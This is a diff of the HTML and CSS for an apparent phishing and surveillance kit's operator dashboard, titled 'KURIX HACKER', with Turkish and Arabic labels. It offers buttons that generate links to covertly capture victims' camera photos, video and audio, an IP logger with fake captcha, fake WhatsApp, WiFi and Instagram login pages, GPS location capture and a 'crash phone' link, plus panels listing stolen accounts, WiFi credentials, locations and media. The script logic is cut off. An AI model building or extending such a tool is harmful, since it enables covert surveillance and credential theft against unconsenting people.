@@ -1,178 +1,630 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="tr" dir="ltr">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes, viewport-fit=cover">
-    <title>⛧ KURABI_USER ⛧</title>
+    <title>⛧ KURIX HACKER ⛧</title>
     <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; }
-        body {
-            background: #0a0c15;
-            font-family: 'Segoe UI', 'Courier New', monospace;
-            padding: 16px;
-            min-height: 100vh;
+        :root {
+            --bg: #050810;
+            --bg2: #0a0e1c;
+            --bg3: #0f1424;
+            --bg4: #141a2e;
+            --border: #1c2440;
+            --green: #00e676;
+            --green2: #00c853;
+            --glow: #00ff41;
+            --red: #ff1744;
+            --red2: #d50000;
+            --orange: #ff9100;
+            --cyan: #00e5ff;
+            --cyan2: #00b8d4;
+            --text: #e8eaf0;
+            --muted: #7a8090;
+            --radius-sm: 12px;
+            --radius: 16px;
+            --radius-lg: 22px;
+            --shadow: 0 4px 24px rgba(0,0,0,0.4);
+            --transition: all 0.2s cubic-bezier(0.4,0,0.2,1);
         }
-        .container { max-width: 1300px; margin: 0 auto; }
         
-        /* HEADER */
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        
+        body {
+            background: var(--bg);
+            background-image: 
+                radial-gradient(ellipse at 20% 0%, rgba(0,230,118,0.03) 0%, transparent 50%),
+                radial-gradient(ellipse at 80% 100%, rgba(0,229,255,0.03) 0%, transparent 50%);
+            font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
+            padding: 12px;
+            min-height: 100vh;
+            color: var(--text);
+            display: flex;
+            justify-content: center;
+        }
+        
+        .container {
+            width: 100%;
+            max-width: 640px;
+            display: flex;
+            flex-direction: column;
+            gap: 12px;
+        }
+        
+        /* ============ HEADER ============ */
         .header {
-            background: #0f111a;
-            border-bottom: 2px solid #00ff41;
-            padding: 12px 20px;
-            margin-bottom: 24px;
-            border-radius: 16px 16px 0 0;
+            background: var(--bg2);
+            border: 1px solid var(--border);
+            border-radius: var(--radius-lg);
+            padding: 14px 18px;
             display: flex;
             justify-content: space-between;
             align-items: center;
             flex-wrap: wrap;
-            gap: 12px;
+            gap: 10px;
+            box-shadow: var(--shadow);
+            position: sticky;
+            top: 12px;
+            z-index: 100;
+            backdrop-filter: blur(10px);
         }
-        .title { color: #00ff41; font-size: 1.6rem; font-weight: bold; text-shadow: 0 0 8px #00ff41; letter-spacing: 2px; }
-        .title span { color: #ff3366; }
-        .access-badge { background: #00ff4111; border: 1px solid #00ff41; padding: 6px 16px; border-radius: 30px; font-size: 0.7rem; color: #00ff41; }
-        .lang-btn, .logout-btn { background: #1a1d2e; border: 1px solid #2a2e44; color: #ccc; padding: 6px 16px; border-radius: 30px; cursor: pointer; font-family: monospace; font-size: 0.7rem; transition: 0.2s; }
-        .lang-btn:hover { border-color: #00ff41; color: #00ff41; }
-        .logout-btn { background: #ff3366; border-color: #ff3366; color: #fff; }
-        .logout-btn:hover { background: #ff0040; }
+        .logo-area { display: flex; align-items: center; gap: 8px; }
+        .logo-symbol {
+            font-size: 1.6rem;
+            animation: logoPulse 2s infinite;
+        }
+        @keyframes logoPulse {
+            0%,100% { text-shadow: 0 0 8px rgba(255,23,68,0.6); }
+            50% { text-shadow: 0 0 20px rgba(255,23,68,0.9); }
+        }
+        .logo-text { color: var(--glow); font-size: 1.15rem; font-weight: 800; letter-spacing: 1.5px; text-shadow: 0 0 14px rgba(0,255,65,0.3); }
+        .logo-text .red { color: var(--red); }
+        .header-right { display: flex; gap: 6px; align-items: center; flex-wrap: wrap; }
+        .status-badge {
+            background: rgba(0,230,118,0.07);
+            border: 1px solid rgba(0,230,118,0.25);
+            padding: 5px 12px;
+            border-radius: 18px;
+            font-size: 0.58rem;
+            color: var(--green);
+            font-weight: 700;
+            letter-spacing: 0.8px;
+            text-transform: uppercase;
+            white-space: nowrap;
+        }
+        .flag-btn {
+            background: var(--bg3);
+            border: 2px solid var(--border);
+            padding: 6px 10px;
+            border-radius: 14px;
+            cursor: pointer;
+            font-size: 1.2rem;
+            transition: var(--transition);
+            line-height: 1;
+        }
+        .flag-btn:hover { border-color: var(--green); transform: scale(1.05); }
+        .flag-btn.active { border-color: var(--green); background: rgba(0,230,118,0.1); box-shadow: 0 0 14px rgba(0,230,118,0.15); }
+        .btn-logout {
+            background: var(--red);
+            border: none;
+            color: #fff;
+            padding: 6px 14px;
+            border-radius: 18px;
+            cursor: pointer;
+            font-weight: 700;
+            font-size: 0.6rem;
+            letter-spacing: 0.5px;
+            transition: var(--transition);
+            font-family: inherit;
+            white-space: nowrap;
+        }
+        .btn-logout:hover { background: var(--red2); transform: translateY(-1px); }
         
-        /* STATS */
-        .stats-grid { display: flex; gap: 16px; flex-wrap: wrap; margin-bottom: 24px; }
-        .stat-card { background: #0f111a; border: 1px solid #2a2e44; border-radius: 20px; padding: 16px 24px; flex: 1; min-width: 130px; text-align: center; }
-        .stat-card h4 { color: #888; font-size: 0.7rem; letter-spacing: 1px; margin-bottom: 8px; }
-        .stat-card .value { color: #00ff41; font-size: 1.8rem; font-weight: bold; }
+        /* ============ STATS ============ */
+        .stats-row { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; }
+        .stat-card {
+            background: var(--bg2);
+            border: 1px solid var(--border);
+            border-radius: var(--radius);
+            padding: 16px;
+            text-align: center;
+            box-shadow: var(--shadow);
+            transition: var(--transition);
+        }
+        .stat-card:hover { border-color: var(--green); transform: translateY(-2px); }
+        .stat-icon { font-size: 1.5rem; margin-bottom: 4px; }
+        .stat-label { color: var(--muted); font-size: 0.55rem; letter-spacing: 1.5px; text-transform: uppercase; font-weight: 600; margin: 4px 0; }
+        .stat-value { color: var(--glow); font-size: 1.6rem; font-weight: 800; text-shadow: 0 0 10px rgba(0,255,65,0.3); }
         
-        /* PANEL */
-        .panel { background: #0f111a; border: 1px solid #2a2e44; border-radius: 24px; padding: 20px; margin-bottom: 24px; }
-        .panel h3 { color: #00ff41; margin-bottom: 18px; font-size: 1rem; border-left: 3px solid #ff3366; padding-left: 14px; }
-        .panel-sub { background: #0a0c15; border-left: 3px solid #00ff41; padding: 12px 16px; margin: 12px 0; border-radius: 12px; }
+        /* ============ PANEL ============ */
+        .panel {
+            background: var(--bg2);
+            border: 1px solid var(--border);
+            border-radius: var(--radius-lg);
+            padding: 18px;
+            box-shadow: var(--shadow);
+            transition: var(--transition);
+        }
+        .panel-header {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            margin-bottom: 14px;
+            padding-bottom: 10px;
+            border-bottom: 1px solid var(--border);
+        }
+        .panel-icon { font-size: 1.2rem; }
+        .panel-title { color: var(--glow); font-size: 0.82rem; font-weight: 700; letter-spacing: 0.5px; flex: 1; }
+        .panel-badge {
+            font-size: 0.52rem;
+            background: rgba(255,23,68,0.1);
+            color: var(--red);
+            padding: 3px 10px;
+            border-radius: 12px;
+            font-weight: 700;
+            letter-spacing: 0.5px;
+            white-space: nowrap;
+        }
+        .panel-badge.cyan { background: rgba(0,229,255,0.1); color: var(--cyan); }
+        .panel-badge.orange { background: rgba(255,145,0,0.1); color: var(--orange); }
         
-        /* DURATION */
-        .duration-slider { display: flex; align-items: center; gap: 16px; flex-wrap: wrap; background: #0a0c15; padding: 12px 16px; border-radius: 40px; margin-bottom: 20px; }
-        .duration-slider label { color: #00ff41; font-size: 0.8rem; }
-        .duration-slider input { flex: 1; max-width: 250px; background: #1f2235; height: 4px; border-radius: 10px; }
-        .duration-value { background: #00ff4122; color: #00ff41; padding: 4px 14px; border-radius: 30px; font-weight: bold; }
+        /* SLIDER */
+        .slider-group {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            background: var(--bg3);
+            padding: 10px 14px;
+            border-radius: 26px;
+            margin-bottom: 12px;
+            flex-wrap: wrap;
+            border: 1px solid var(--border);
+        }
+        .slider-label {
+            color: var(--green);
+            font-size: 0.62rem;
+            font-weight: 600;
+            white-space: nowrap;
+            display: flex;
+            align-items: center;
+            gap: 4px;
+            min-width: 60px;
+        }
+        .slider-input {
+            flex: 1;
+            min-width: 80px;
+            accent-color: var(--green);
+            height: 5px;
+            cursor: pointer;
+        }
+        .slider-value {
+            background: rgba(0,230,118,0.12);
+            color: var(--glow);
+            padding: 5px 12px;
+            border-radius: 16px;
+            font-weight: 700;
+            font-size: 0.62rem;
+            white-space: nowrap;
+            min-width: 50px;
+            text-align: center;
+        }
         
-        /* BUTTON GRUPLARI */
-        .btn-group-custom { display: flex; gap: 10px; flex-wrap: wrap; margin-bottom: 15px; }
-        .btn-primary { background: transparent; border: 1px solid #00ff41; color: #00ff41; padding: 10px 20px; border-radius: 40px; cursor: pointer; font-weight: bold; transition: 0.2s; }
-        .btn-primary:hover { background: #00ff41; color: #000; transform: translateY(-2px); }
-        .btn-instagram { border-color: #ff3366; color: #ff3366; }
-        .btn-instagram:hover { background: #ff3366; color: #fff; }
-        .btn-hack { border-color: #ffaa00; color: #ffaa00; }
-        .btn-hack:hover { background: #ffaa00; color: #000; }
-        .btn-danger-custom { border-color: #ff3366; color: #ff3366; }
-        .btn-danger-custom:hover { background: #ff3366; color: #fff; }
+        /* BUTTONS */
+        .btn-row { display: flex; gap: 6px; flex-wrap: wrap; }
+        .btn {
+            padding: 9px 13px;
+            border-radius: 22px;
+            border: 1.5px solid var(--green);
+            background: transparent;
+            color: var(--glow);
+            cursor: pointer;
+            font-size: 0.64rem;
+            font-weight: 700;
+            transition: var(--transition);
+            white-space: nowrap;
+            font-family: inherit;
+            letter-spacing: 0.3px;
+            display: flex;
+            align-items: center;
+            gap: 4px;
+        }
+        .btn:hover { background: var(--green); color: #000; transform: translateY(-2px); box-shadow: 0 6px 20px rgba(0,230,118,0.3); }
+        .btn:active { transform: scale(0.96); }
+        .btn.insta { border-color: var(--red); color: var(--red); }
+        .btn.insta:hover { background: var(--red); color: #fff; box-shadow: 0 6px 20px rgba(255,23,68,0.3); }
+        .btn.hack { border-color: var(--orange); color: var(--orange); }
+        .btn.hack:hover { background: var(--orange); color: #000; box-shadow: 0 6px 20px rgba(255,145,0,0.3); }
+        .btn.cyan { border-color: var(--cyan); color: var(--cyan); }
+        .btn.cyan:hover { background: var(--cyan); color: #000; box-shadow: 0 6px 20px rgba(0,229,255,0.3); }
+        .btn.danger { border-color: var(--red); color: var(--red); background: rgba(255,23,68,0.05); }
+        .btn.danger:hover { background: var(--red); color: #fff; box-shadow: 0 6px 20px rgba(255,23,68,0.3); }
+        .btn.crash {
+            border-color: #ff0000;
+            color: #ff0000;
+            animation: crashPulse 1.8s infinite;
+        }
+        .btn.crash:hover { background: #ff0000; color: #fff; box-shadow: 0 6px 24px rgba(255,0,0,0.5); }
+        @keyframes crashPulse {
+            0%,100% { box-shadow: 0 0 0 rgba(255,0,0,0); }
+            50% { box-shadow: 0 0 18px rgba(255,0,0,0.5); }
+        }
         
-        /* AYIRICI */
-        .section-divider { display: flex; align-items: center; gap: 12px; margin: 20px 0 15px; }
-        .section-divider span { background: #2a2e44; padding: 4px 16px; border-radius: 30px; font-size: 0.7rem; color: #00ff41; }
-        .section-divider hr { flex: 1; border-color: #2a2e44; }
+        /* OUTPUT */
+        .output-box {
+            background: var(--bg3);
+            border: 1px dashed rgba(0,230,118,0.2);
+            border-radius: var(--radius-sm);
+            padding: 12px;
+            font-size: 0.58rem;
+            word-break: break-all;
+            margin-top: 10px;
+            line-height: 1.7;
+        }
+        .output-box a { color: var(--glow); font-weight: 600; }
+        .output-box a.crash-link { color: #ff0000; font-weight: 800; }
+        .output-box a.cyan-link { color: var(--cyan); font-weight: 600; }
+        .btn-copy {
+            background: var(--green);
+            border: none;
+            padding: 4px 10px;
+            border-radius: 12px;
+            cursor: pointer;
+            font-weight: 700;
+            font-size: 0.52rem;
+            color: #000;
+            font-family: inherit;
+            transition: var(--transition);
+        }
+        .btn-copy:hover { background: var(--green2); transform: scale(1.05); }
+        .output-note { font-size: 0.5rem; margin-top: 4px; display: block; }
+        .output-note.red { color: #ff0000; }
+        .output-note.cyan { color: var(--cyan); }
         
-        .output-box { background: #0a0c15; border: 1px dashed #00ff41; border-radius: 16px; padding: 14px; font-size: 0.7rem; word-break: break-all; margin-top: 15px; }
-        .copy-btn { background: #00ff41; border: none; padding: 4px 12px; border-radius: 20px; cursor: pointer; font-weight: bold; margin-left: 8px; }
+        /* ============ CARDS ============ */
+        .media-card {
+            background: var(--bg3);
+            border: 1px solid var(--border);
+            border-radius: var(--radius);
+            margin-bottom: 8px;
+            overflow: hidden;
+            transition: var(--transition);
+        }
+        .media-card:hover { border-color: var(--green); }
+        .media-card-header {
+            padding: 10px 14px;
+            border-bottom: 1px solid var(--border);
+            display: flex;
+            justify-content: space-between;
+            flex-wrap: wrap;
+            gap: 4px;
+            background: var(--bg4);
+        }
+        .media-card-ip { color: var(--green); font-size: 0.56rem; font-weight: 700; }
+        .media-card-time { color: var(--muted); font-size: 0.5rem; }
+        .media-strip { display: flex; overflow-x: auto; gap: 8px; padding: 12px; }
+        .media-strip img, .media-strip video {
+            width: 70px;
+            height: 70px;
+            object-fit: cover;
+            border: 2px solid var(--green);
+            border-radius: 10px;
+            cursor: pointer;
+            flex-shrink: 0;
+            transition: var(--transition);
+        }
+        .media-strip img:hover, .media-strip video:hover { transform: scale(1.08); border-color: var(--glow); box-shadow: 0 0 14px rgba(0,255,65,0.3); }
+        .media-card-footer {
+            padding: 10px 14px;
+            border-top: 1px solid var(--border);
+            display: flex;
+            justify-content: flex-end;
+            gap: 6px;
+            flex-wrap: wrap;
+        }
+        .btn-download {
+            background: var(--green);
+            color: #000;
+            border: none;
+            padding: 5px 12px;
+            border-radius: 14px;
+            cursor: pointer;
+            font-weight: 700;
+            font-size: 0.55rem;
+            font-family: inherit;
+            transition: var(--transition);
+        }
+        .btn-download:hover { background: var(--green2); transform: scale(1.03); }
+        .btn-delete {
+            background: var(--red);
+            color: #fff;
+            border: none;
+            padding: 5px 12px;
+            border-radius: 14px;
+            cursor: pointer;
+            font-weight: 700;
+            font-size: 0.55rem;
+            font-family: inherit;
+            transition: var(--transition);
+        }
+        .btn-delete:hover { background: var(--red2); transform: scale(1.03); }
         
-        /* MEDYA KARTLARI */
-        .card { background: #0f111a; border: 1px solid #2a2e44; border-radius: 20px; margin-bottom: 16px; overflow: hidden; }
-        .card-header { background: #0a0c15; padding: 12px 16px; border-bottom: 1px solid #2a2e44; display: flex; justify-content: space-between; flex-wrap: wrap; gap: 8px; }
-        .card-header .ip { color: #00ff41; font-size: 0.7rem; }
-        .card-header .time { color: #888; font-size: 0.6rem; }
-        .media-strip { display: flex; overflow-x: auto; gap: 12px; padding: 16px; }
-        .media-strip img, .media-strip video { width: 100px; height: 100px; object-fit: cover; border: 2px solid #00ff41; border-radius: 12px; cursor: pointer; }
-        .card-footer { padding: 12px 16px; border-top: 1px solid #2a2e44; display: flex; justify-content: flex-end; gap: 10px; }
-        .download-btn, .delete-single { padding: 6px 14px; border-radius: 30px; border: none; cursor: pointer; font-size: 0.65rem; font-weight: bold; }
-        .download-btn { background: #00ff41; color: #000; }
-        .delete-single { background: #ff3366; color: #fff; }
+        /* LOCATION CARDS */
+        .loc-card {
+            background: var(--bg3);
+            border: 1px solid var(--border);
+            border-radius: var(--radius);
+            padding: 14px;
+            margin-bottom: 6px;
+            transition: var(--transition);
+        }
+        .loc-card:hover { border-color: var(--cyan); }
+        .loc-header { display: flex; justify-content: space-between; align-items: flex-start; gap: 6px; margin-bottom: 6px; }
+        .loc-coords { color: var(--cyan); font-size: 0.66rem; font-weight: 700; }
+        .loc-time { color: var(--muted); font-size: 0.5rem; white-space: nowrap; }
+        .loc-address { color: var(--text); font-size: 0.56rem; margin-bottom: 6px; line-height: 1.5; }
+        .loc-details { font-size: 0.5rem; color: var(--muted); margin-bottom: 8px; display: flex; gap: 10px; flex-wrap: wrap; }
+        .loc-details span { color: var(--text); font-weight: 700; }
+        .btn-maps {
+            display: inline-block;
+            background: var(--cyan);
+            color: #000;
+            padding: 6px 14px;
+            border-radius: 16px;
+            font-size: 0.56rem;
+            font-weight: 700;
+            text-decoration: none;
+            transition: var(--transition);
+        }
+        .btn-maps:hover { background: var(--cyan2); transform: scale(1.03); }
         
-        .loading { text-align: center; color: #00ff41; padding: 40px; }
-        .modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.97); z-index: 2000; justify-content: center; align-items: center; cursor: pointer; }
-        .modal img, .modal video { max-width: 90%; max-height: 90%; border: 2px solid #00ff41; border-radius: 16px; }
-        .modal-close { position: absolute; top: 20px; right: 30px; color: #00ff41; font-size: 36px; cursor: pointer; }
-        body.rtl .panel h3 { border-left: none; border-right: 3px solid #ff3366; padding-left: 0; padding-right: 14px; }
-        @media (max-width: 650px) { .btn-primary { padding: 6px 12px; font-size: 0.65rem; } .media-strip img { width: 70px; height: 70px; } }
+        /* ACCOUNT / WIFI CARDS */
+        .acc-card, .wifi-card {
+            background: var(--bg3);
+            border: 1px solid var(--border);
+            border-radius: var(--radius-sm);
+            padding: 12px;
+            margin-bottom: 5px;
+            transition: var(--transition);
+        }
+        .acc-card:hover { border-color: var(--red); }
+        .wifi-card:hover { border-color: var(--orange); }
+        .acc-header, .wifi-header { display: flex; justify-content: space-between; align-items: center; gap: 4px; margin-bottom: 5px; }
+        .acc-user { color: var(--green); font-size: 0.7rem; font-weight: 700; }
+        .wifi-ssid { color: var(--orange); font-size: 0.66rem; font-weight: 700; }
+        .acc-time, .wifi-time { color: var(--muted); font-size: 0.5rem; }
+        .acc-row, .wifi-row { color: var(--muted); font-size: 0.54rem; margin-top: 2px; }
+        .acc-row span, .wifi-row span { color: var(--text); font-weight: 700; }
+        
+        /* LOADING / EMPTY */
+        .loading-text { text-align: center; color: var(--green); padding: 24px; font-size: 0.7rem; }
+        .empty-text { text-align: center; color: var(--red); padding: 24px; font-size: 0.65rem; }
+        .error-text { text-align: center; color: #ff0000; padding: 24px; font-size: 0.65rem; }
+        .empty-desc { color: var(--muted); font-size: 0.5rem; margin-top: 4px; display: block; }
+        
+        /* MODAL */
+        .modal-overlay {
+            display: none;
+            position: fixed;
+            inset: 0;
+            background: rgba(0,0,0,0.96);
+            z-index: 2000;
+            justify-content: center;
+            align-items: center;
+            cursor: pointer;
+            padding: 20px;
+        }
+        .modal-overlay img, .modal-overlay video {
+            max-width: 94%;
+            max-height: 90%;
+            border: 2px solid var(--green);
+            border-radius: var(--radius);
+            box-shadow: 0 0 40px rgba(0,230,118,0.2);
+        }
+        .modal-close {
+            position: absolute;
+            top: 16px;
+            right: 20px;
+            color: var(--glow);
+            font-size: 30px;
+            cursor: pointer;
+            z-index: 2001;
+            background: rgba(0,0,0,0.6);
+            width: 40px;
+            height: 40px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            transition: var(--transition);
+        }
+        .modal-close:hover { background: var(--red); color: #fff; }
+        .modal-download-btn {
+            position: absolute;
+            bottom: 20px;
+            left: 50%;
+            transform: translateX(-50%);
+            background: var(--green);
+            color: #000;
+            border: none;
+            padding: 8px 20px;
+            border-radius: 20px;
+            font-weight: 700;
+            font-size: 0.65rem;
+            cursor: pointer;
+            z-index: 2001;
+            font-family: inherit;
+            transition: var(--transition);
+        }
+        .modal-download-btn:hover { background: var(--green2); transform: translateX(-50%) scale(1.05); }
+        
+        /* RTL */
+        body.rtl { direction: rtl; text-align: right; }
+        body.rtl .modal-close { right: auto; left: 20px; }
+        body.rtl .panel-header { flex-direction: row-reverse; }
+        body.rtl .header { flex-direction: row-reverse; }
+        body.rtl .slider-group { flex-direction: row-reverse; }
+        
+        /* SCROLLBAR */
+        ::-webkit-scrollbar { height: 3px; width: 3px; }
+        ::-webkit-scrollbar-track { background: transparent; }
+        ::-webkit-scrollbar-thumb { background: var(--green); border-radius: 10px; }
+        
+        @media (max-width: 400px) {
+            .btn { padding: 7px 10px; font-size: 0.58rem; }
+            .media-strip img, .media-strip video { width: 55px; height: 55px; }
+        }
     </style>
 </head>
 <body>
 <div class="container">
+    <!-- HEADER -->
     <div class="header">
-        <div class="title">⛧ <span>KURABI</span>_USER ⛧</div>
-        <div class="header-right" style="display: flex; gap: 10px; align-items: center;">
-            <div class="access-badge" id="accessText">ACCESS: GRANTED</div>
-            <button class="lang-btn" id="langBtn">🇸🇦 العربية</button>
-            <button class="logout-btn" id="logoutBtn">⛧ LOGOUT</button>
+        <div class="logo-area">
+            <span class="logo-symbol">⛧</span>
+            <span class="logo-text"><span class="red">KURIX</span> HACKER</span>
+        </div>
+        <div class="header-right">
+            <span class="status-badge" id="accessText">ONLINE</span>
+            <button class="flag-btn active" id="langTrBtn" title="Türkçe">🇹🇷</button>
+            <button class="flag-btn" id="langArBtn" title="العربية">🇸🇦</button>
+            <button class="btn-logout" id="logoutBtn">⛧ ÇIKIŞ</button>
         </div>
     </div>
     
-    <div class="stats-grid">
-        <div class="stat-card"><h4 id="myCapturesLabel">MY CAPTURES</h4><div class="value" id="captureCount">0</div></div>
-        <div class="stat-card"><h4 id="totalMediaLabel">TOTAL MEDIA</h4><div class="value" id="mediaCount">0</div></div>
+    <!-- STATS -->
+    <div class="stats-row">
+        <div class="stat-card">
+            <div class="stat-icon">📸</div>
+            <div class="stat-label" id="statCaptures">ÇEKİMLER</div>
+            <div class="stat-value" id="captureCount">0</div>
+        </div>
+        <div class="stat-card">
+            <div class="stat-icon">🎬</div>
+            <div class="stat-label" id="statMedia">MEDYA</div>
+            <div class="stat-value" id="mediaCount">0</div>
+        </div>
     </div>
     
-    <!-- NORMAL KAMERA BÖLÜMÜ -->
+    <!-- NORMAL KAMERA -->
     <div class="panel">
-        <h3 id="generateLabel">⟳ NORMAL CAMERA LINK</h3>
-        <div class="duration-slider">
-            <label id="durationLabel">🎬 VIDEO DURATION:</label>
-            <input type="range" id="videoDuration" min="1" max="60" value="6">
-            <span class="duration-value" id="durationValue">6 sec</span>
+        <div class="panel-header">
+            <span class="panel-icon">📷</span>
+            <span class="panel-title" id="panelCamera">KAMERA</span>
         </div>
-        <div class="btn-group-custom">
-            <button class="btn-primary" id="genPhotoBtn">📸 PHOTO (1)</button>
-            <button class="btn-primary" id="gen5PhotoBtn">📸 5 PHOTOS</button>
-            <button class="btn-primary" id="genVideoOnlyBtn">🎬 VIDEO (NO AUDIO)</button>
-            <button class="btn-primary" id="genAudioBtn">🎤 AUDIO ONLY</button>
-            <button class="btn-primary" id="genVideoAudioBtn">🎬🎤 VIDEO+AUDIO</button>
+        <div class="slider-group">
+            <span class="slider-label">🎬 <span id="labelDuration">SÜRE</span></span>
+            <input type="range" class="slider-input" id="videoDuration" min="1" max="60" value="6">
+            <span class="slider-value" id="durationValue">6sn</span>
         </div>
-        <div class="output-box" id="linkOutput"></div>
+        <div class="btn-row">
+            <button class="btn" id="btnPhoto1">📸 FOTO</button>
+            <button class="btn" id="btnPhoto5">📸 5FOTO</button>
+            <button class="btn" id="btnVideo">🎬 VİDEO</button>
+            <button class="btn" id="btnAudio">🎤 SES</button>
+            <button class="btn" id="btnVideoAudio">🎬🎤 V+SES</button>
+        </div>
+        <div class="output-box" id="outputCamera"></div>
     </div>
     
-    <!-- INSTAGRAM ÖZEL BÖLÜM (AYRI) -->
+    <!-- INSTAGRAM KAMERA -->
     <div class="panel">
-        <h3>📱 INSTAGRAM SPECIAL (CHROME FORCE)</h3>
-        <div class="section-divider"><hr><span>INSTAGRAM WEBVIEW BYPASS</span><hr></div>
-        <div class="btn-group-custom">
-            <button class="btn-primary btn-instagram" id="igPhotoBtn">📸 INSTA PHOTO</button>
-            <button class="btn-primary btn-instagram" id="ig5PhotoBtn">📸 INSTA 5 PHOTOS</button>
-            <button class="btn-primary btn-instagram" id="igVideoOnlyBtn">🎬 INSTA VIDEO (NO AUDIO)</button>
-            <button class="btn-primary btn-instagram" id="igAudioBtn">🎤 INSTA AUDIO</button>
-            <button class="btn-primary btn-instagram" id="igVideoAudioBtn">🎬🎤 INSTA VIDEO+AUDIO</button>
+        <div class="panel-header">
+            <span class="panel-icon">📱</span>
+            <span class="panel-title" id="panelInsta">INSTAGRAM KAMERA</span>
+            <span class="panel-badge">CHROME</span>
         </div>
-        <div class="output-box" id="igLinkOutput"></div>
-        <div class="section-divider"><hr><span style="color:#ffaa00;">HACK TOOLS</span><hr></div>
+        <div class="slider-group">
+            <span class="slider-label">🎬 <span id="labelInstaDuration">INSTA SÜRE</span></span>
+            <input type="range" class="slider-input" id="igVideoDuration" min="1" max="60" value="6">
+            <span class="slider-value" id="igDurationValue">6sn</span>
+        </div>
+        <div class="btn-row">
+            <button class="btn insta" id="btnIgPhoto">📸 FOTO</button>
+            <button class="btn insta" id="btnIgPhoto5">📸 5FOTO</button>
+            <button class="btn insta" id="btnIgVideo">🎬 VİDEO</button>
+            <button class="btn insta" id="btnIgAudio">🎤 SES</button>
+            <button class="btn insta" id="btnIgVideoAudio">🎬🎤 V+SES</button>
+        </div>
+        <div class="output-box" id="outputInsta"></div>
     </div>
     
-    <!-- HACK BÖLÜMÜ: 2 YENİ ÖZELLİK -->
+    <!-- HACK ARAÇLARI -->
     <div class="panel">
-        <h3>⚡ HACK / PHISHING TOOLS</h3>
-        <div class="btn-group-custom">
-            <button class="btn-primary btn-hack" id="ipLoggerBtn">📡 IP LOGGER + FAKE CAPTCHA</button>
-            <button class="btn-primary btn-hack" id="fakeWABtn">🔐 FAKE WHATSAPP LOGIN</button>
-            <button class="btn-primary btn-hack" id="crashBtn">💀 CRASH PHONE (RAM KILLER)</button>
-			<button class="btn-primary btn-hack" id="instaLogsBtn">📸 INSTAGRAM LOGS</button>
+        <div class="panel-header">
+            <span class="panel-icon">⚡</span>
+            <span class="panel-title" id="panelHack">HACK ARAÇLARI</span>
         </div>
-        <div class="output-box" id="hackOutput"></div>
+        <div class="btn-row">
+            <button class="btn hack" id="btnIpLogger">📡 IP LOGGER</button>
+            <button class="btn hack" id="btnWaFake">🔐 WHATSAPP</button>
+            <button class="btn hack" id="btnWifiFake">📶 WIFI FAKE</button>
+            <button class="btn hack" id="btnIgFake">📸 INSTAGRAM</button>
+            <button class="btn cyan" id="btnLocation">📍 KONUM</button>
+            <button class="btn crash" id="btnCrash">💀 CRASH</button>
+        </div>
+        <div class="output-box" id="outputHack"></div>
     </div>
     
-    <div class="btn-group-custom" style="margin-bottom: 20px;">
-        <button class="btn-primary" id="refreshBtn">⟳ REFRESH</button>
-        <button class="btn-primary btn-danger-custom" id="clearAllBtn">⛧ CLEAR ALL</button>
-        <button class="btn-primary" id="statsInfoBtn">📊 STATS INFO</button>
+    <!-- KONUMLAR -->
+    <div class="panel">
+        <div class="panel-header">
+            <span class="panel-icon">📍</span>
+            <span class="panel-title" id="panelLocations">KONUMLAR</span>
+            <span class="panel-badge cyan" id="badgeLocations">GPS</span>
+        </div>
+        <div class="btn-row" style="margin-bottom:10px;">
+            <button class="btn" id="btnRefreshLoc">⟳ <span id="labelRefreshLoc">YENİLE</span></button>
+            <button class="btn danger" id="btnClearLoc">🗑 <span id="labelClearLoc">TEMİZLE</span></button>
+        </div>
+        <div id="locationsList"></div>
     </div>
     
-    <div id="list"></div>
+    <!-- WIFI HESAPLAR -->
+    <div class="panel">
+        <div class="panel-header">
+            <span class="panel-icon">📶</span>
+            <span class="panel-title" id="panelWifi">WIFI HESAPLAR</span>
+            <span class="panel-badge orange">WiFi</span>
+        </div>
+        <div class="btn-row" style="margin-bottom:10px;">
+            <button class="btn" id="btnRefreshWifi">⟳ <span id="labelRefreshWifi">YENİLE</span></button>
+            <button class="btn danger" id="btnClearWifi">🗑 <span id="labelClearWifi">TEMİZLE</span></button>
+        </div>
+        <div id="wifiList"></div>
+    </div>
+    
+    <!-- INSTAGRAM HESAPLAR -->
+    <div class="panel">
+        <div class="panel-header">
+            <span class="panel-icon">📋</span>
+            <span class="panel-title" id="panelAccounts">INSTAGRAM HESAPLAR</span>
+            <span class="panel-badge">IG</span>
+        </div>
+        <div class="btn-row" style="margin-bottom:10px;">
+            <button class="btn" id="btnRefreshAcc">⟳ <span id="labelRefreshAcc">YENİLE</span></button>
+            <button class="btn danger" id="btnClearAcc">🗑 <span id="labelClearAcc">TEMİZLE</span></button>
+        </div>
+        <div id="accountsList"></div>
+    </div>
+    
+    <!-- ALT BUTONLAR -->
+    <div class="btn-row" style="justify-content:center;margin-bottom:4px;">
+        <button class="btn" id="btnRefreshAll">⟳ <span id="labelRefreshAll">TÜMÜNÜ YENİLE</span></button>
+        <button class="btn danger" id="btnClearAll">⛧ <span id="labelClearAll">TÜM ÇEKİMLERİ SİL</span></button>
+    </div>
+    
+    <div id="capturesList"></div>
 </div>
 
-<div id="modal" class="modal"><span class="modal-close">✕</span><div id="modalContent"></div></div>
-
-<script src="config.js"></script>
+<!-- MODAL -->
+<div class="modal-overlay" id="modal">
+    <span class="modal-close" id="modalClose">✕</span>
+    <div id="modalContent"></div>
+    <button class="modal-download-btn" id="modalDownloadBtn" style="display:none;">⬇ İNDİR</button>
+</div>
 
 <script type="importmap">
-    {
-        "imports": {
-            "firebase/app": "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js",
-            "firebase/auth": "https://www.gstatic.com/firebasejs/10.8.0/firebase-auth.js",
-            "firebase/firestore": "https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore.js"
-        }
-    }
+    { "imports": { "firebase/app": "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js", "firebase/auth": "https://www.gstatic.com/firebasejs/10.8.0/firebase-auth.js", "firebase/firestore": "https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore.js" } }
 </script>
 
 <script type="module">
@@ -180,237 +632,335 @@
